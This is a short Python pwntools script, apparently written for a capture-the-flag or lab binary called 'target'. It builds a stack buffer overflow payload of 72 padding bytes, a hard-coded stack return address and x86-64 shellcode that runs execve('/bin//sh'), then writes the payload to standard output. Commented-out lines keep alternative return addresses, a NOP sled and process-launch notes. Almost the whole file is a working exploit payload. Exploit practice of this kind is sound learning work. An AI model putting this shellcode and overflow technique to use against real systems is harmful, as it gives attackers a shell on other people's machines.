#! /bin/python

from pwn import *
import sys
#
sc = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

pre = b"\x61"*72
#  ret = b"\x10\xdc\xff\xff\xff\x7f\x00\x00"
ret = b"\x00\xdb\xff\xff\xff\x7f\x00\x00"
#  sc = pre + ret + sc
#  pad = b"\x90" * 4 * 30
sc = pre + ret + sc
#  sc = b"\x00" * 80
#
#
sys.stdout.buffer.write(sc)
#  print(sc)
#  print(sc.hex('_'))
#
#  sch=sc.hex()
#  str(sch)



#  if sys.argv[1] == "pwn":
#  # Set up pwntools to work with this binary
#  elf = context.binary = ELF('target')
#
#  # Enable verbose logging so we can see exactly what is being sent.
#  context.log_level = 'debug'
#
#  # Print out the target address
#  #  ret2win = elf.symbols.ret2win
#  #  info("%#x target", elf.symbols.ret2win)
#
#  # Figure out how big of an overflow we need by crashing the
#  # process once.
#  io = process(elf.path)
#
#  # We will send a 'cyclic' pattern which overwrites the return
#  # address on the stack.  The value 128 is longer than the buffer.
#  io.sendline(sc)
#
